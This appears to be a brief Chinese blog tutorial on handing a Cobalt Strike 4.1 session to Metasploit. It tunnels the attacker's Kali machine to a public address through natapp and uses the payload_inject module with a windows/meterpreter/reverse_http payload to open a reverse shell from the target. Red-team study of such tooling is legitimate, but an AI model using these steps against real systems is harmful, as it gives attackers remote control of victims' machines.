CobaltStrike4.1学习笔记——cs与msf联动

2021-02-03
学习笔记-CobaltStrike

如何把cs的shell传入到msf

kali上的公网映射

因为我kali是虚拟机，所以用natapp映射到公网上（具体natapp的使用详见官网）

此时你的msf就活动一个公网地址和公网端口

CobaltStrik上的操作

新建一个监听器 监听msf的IP地址

msf-ip就是natapp的IP 端口就是随机分配的39398

msf上的操作

调用 payload_inject 模块

use exploit/windows/local/payload_inject

设置 HTTP Payload

set payload windows/meterpreter/reverse_http

LHOST和LPORT就是你映射到natpp的本地IP和端口

然后执行。

在CobaltStrike4.1里右键目标主机 选择spawn

选择你的msf监听器
